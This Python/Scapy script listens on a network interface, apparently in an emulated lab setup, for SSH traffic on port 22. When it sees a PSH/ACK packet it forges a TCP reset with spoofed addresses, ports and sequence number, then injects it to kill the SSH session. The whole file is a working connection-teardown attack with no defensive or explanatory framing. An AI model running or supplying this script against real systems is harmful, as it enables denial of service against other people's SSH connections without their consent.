import scapy.all as scapy
from select import select
from datetime import datetime

interface = "s1-eth4"

def pkt_callback(pkt):

    if pkt.haslayer(scapy.Dot11):
        # construct fake l2 for wifi packet
        macl = pkt.getlayer(scapy.Dot11)
        l2 = scapy.RadioTap() / scapy.Dot11(addr1 = macl.addr2, addr2 = macl.addr1, addr3 = macl.addr3, FCfield="from-DS") / scapy.LLC(ctrl=3) / scapy.SNAP()
    elif pkt.haslayer(scapy.Ether):
        # construct fake l2 for ethernet packet
        macl = pkt.getlayer(scapy.Ether)
        l2 = scapy.Ether(src = macl.dst, dst = macl.src)
    else:
        print("protocol neither ethernet nor wifi, skipping")
        return

    if pkt.haslayer(scapy.IP):
        ipl = pkt.getlayer(scapy.IP)
        l3 = scapy.IP(dst = ipl.src, src = ipl.dst)
    else:
        return

    if pkt.haslayer(scapy.TCP):
        tcpl = pkt.getlayer(scapy.TCP)

        if tcpl.sport == 22:
            l4 = scapy.TCP(sport = tcpl.dport, dport = tcpl.sport)

        else:
            return

        if tcpl.flags == 2 or tcpl.flags == 18: # syn, syn ack
            #print("got tcp syn packet")
            return

        if tcpl.dport == 22: # ssh packet
            #print("SSH packet")
            return

        print("Got TCP flags: ", int(tcpl.flags))
        if tcpl.flags == 24: # psh ack
            print(tcpl.seq)
            # construct rst packet
            pktreply = l2 / l3 / l4
            pktreply.getlayer(scapy.TCP).seq = tcpl.ack
            pktreply.getlayer(scapy.TCP).window = 0
            pktreply.getlayer(scapy.TCP).ack = 0 #tcpl.seq # + len(tcpdata)
            pktreply.getlayer(scapy.TCP).flags = "R"

            packetbasket = [pktreply]
            pktreply.show()
            # send reply packet
            scapy.sendp(packetbasket, verbose = 0, iface = interface)
            print(datetime.utcnow().strftime('%H:%M:%S.%f')[:-3],
                  ": RST packet sent :)", l3.src, ":", l4.sport, ">>", l3.dst,
                  ":", l4.dport)
            print("RST packet sent :)")
            return
    else:
        print("protocol not TCP or UDP, skipping")
        return

    #pkt.show()
if __name__ == "__main__":
    L2socket = scapy.conf.L2listen
    s = L2socket(type=scapy.ETH_P_ALL, iface = interface, filter='tcp and port 22')
    while 1:
        sel = select([s],[],[], None)
        if (s in sel[0]):
            p = s.recv(scapy.MTU)
            if p is None:
                break
            pkt_callback(p)
            # break

